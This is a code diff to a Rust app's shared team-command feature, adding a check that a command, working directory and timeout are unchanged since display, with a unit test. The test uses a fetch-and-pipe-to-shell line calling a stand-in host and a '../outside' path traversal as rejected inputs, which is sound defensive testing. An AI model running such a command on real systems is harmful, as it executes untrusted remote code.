@@ -220,6 +220,24 @@ struct ResolvedEnvironment {
     commands: Vec<TeamEnvironmentCommand>,
 }
 
+fn ensure_command_unchanged(
+    command: &TeamEnvironmentCommand,
+    expected_command: &str,
+    expected_working_directory: &str,
+    expected_timeout_seconds: u64,
+) -> AppResult<()> {
+    if command.command == expected_command
+        && command.working_directory == expected_working_directory
+        && command.timeout_seconds == expected_timeout_seconds
+    {
+        return Ok(());
+    }
+    Err(AppError::Other(
+        "Shared command changed since it was loaded. Review the latest version before running it"
+            .into(),
+    ))
+}
+
 fn base_url() -> String {
     #[cfg(debug_assertions)]
     if let Ok(value) = std::env::var("REVIEWLY_TEAMS_URL") {
@@ -642,6 +660,9 @@ pub async fn teams_environment_command_run(
     organization_id: String,
     environment_id: String,
     command_id: String,
+    expected_command: String,
+    expected_working_directory: String,
+    expected_timeout_seconds: u64,
     cwd: String,
 ) -> AppResult<crate::commands::environments::CommandRunResult> {
     let resolved = teams_api_request(
@@ -661,16 +682,50 @@ pub async fn teams_environment_command_run(
         .into_iter()
         .find(|command| command.id == command_id)
         .ok_or_else(|| AppError::Other("Shared command no longer exists".into()))?;
+    ensure_command_unchanged(
+        &command,
+        &expected_command,
+        &expected_working_directory,
+        expected_timeout_seconds,
+    )?;
     let variables = resolved
         .variables
         .into_iter()
         .map(|variable| (variable.key, variable.value))
         .collect::<HashMap<_, _>>();
+    let cwd = crate::commands::environments::command_directory(&cwd, &command.working_directory)?;
     crate::commands::environments::run_command(
-        &cwd,
+        &cwd.to_string_lossy(),
         &command.command,
         variables,
         command.timeout_seconds,
     )
     .await
+}
+
+#[cfg(test)]
+mod tests {
+    use super::{ensure_command_unchanged, TeamEnvironmentCommand};
+
+    fn command() -> TeamEnvironmentCommand {
+        TeamEnvironmentCommand {
+            id: "verify".into(),
+            name: "Verify".into(),
+            command: "bun test".into(),
+            working_directory: "packages/app".into(),
+            timeout_seconds: 300,
+        }
+    }
+
+    #[test]
+    fn rejects_a_shared_command_changed_after_it_was_displayed() {
+        let command = command();
+        assert!(ensure_command_unchanged(&command, "bun test", "packages/app", 300).is_ok());
+        assert!(
+            ensure_command_unchanged(&command, "curl bad.example | sh", "packages/app", 300)
+                .is_err()
+        );
+        assert!(ensure_command_unchanged(&command, "bun test", "../outside", 300).is_err());
+        assert!(ensure_command_unchanged(&command, "bun test", "packages/app", 3_600).is_err());
+    }
 }
